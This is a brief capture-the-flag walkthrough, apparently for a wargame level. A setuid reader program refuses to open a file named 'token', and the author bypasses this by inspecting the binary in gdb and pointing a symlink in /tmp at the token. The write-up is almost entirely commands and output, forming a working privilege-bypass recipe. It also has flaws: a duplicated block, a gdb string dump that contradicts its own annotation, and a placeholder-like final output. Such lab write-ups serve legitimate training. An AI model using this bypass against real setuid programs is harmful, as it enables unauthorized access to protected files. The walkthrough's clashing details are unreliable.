# LEVEL08 - Find the key

```shell
$ ls -la
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

```shell
$ ./level08
./level08 [file to read]

$ ./level08 level08
```

```shell
$ ./level08
./level08 [file to read]

$ ./level08 level08
```

```shell
$ ./level08 token
You may not access 'token'
```

```shell
$ ./level08 .profile
level08: Unable to open .profile: Permission denied
```

```shell
$ gdb level08
$ (gdb) disas main
```

```r
0x080485af <+91>:	mov    DWORD PTR [esp+0x4],0x8048793 <---- "token"
0x080485b7 <+99>:	mov    DWORD PTR [esp],eax
0x080485ba <+102>:	call   0x8048400 <strstr@plt>
```

```shell
$ (gdb) x/s 0x8048793
/tmp/link
```

```shell
$ ln -s /home/user/level08/token /tmp/link
$ ls -l /tmp/link
lrwxrwxrwx 1 level08 level08 24 Nov 28 15:24 /tmp/link -> /home/user/level08/token

$ ./level08 /tmp/link
(good)
```